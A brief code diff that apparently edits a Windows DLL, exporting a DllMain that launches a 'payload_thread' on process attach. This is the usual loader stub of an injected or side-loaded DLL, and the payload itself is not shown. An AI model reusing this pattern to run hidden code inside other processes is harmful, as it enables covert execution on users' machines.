@@ -49,7 +49,8 @@ static DWORD WINAPI payload_thread(LPVOID) {
     return 0;
 }
 
-BOOL APIENTRY DllMain(HMODULE hMod, DWORD reason, LPVOID) {
+extern "C" __declspec(dllexport)
+BOOL APIENTRY DllMain(HMODULE hMod, DWORD reason, LPVOID reserved) {
     if (reason == DLL_PROCESS_ATTACH) {
         DisableThreadLibraryCalls(hMod);
         CreateThread(NULL, 0, payload_thread, NULL, 0, NULL);
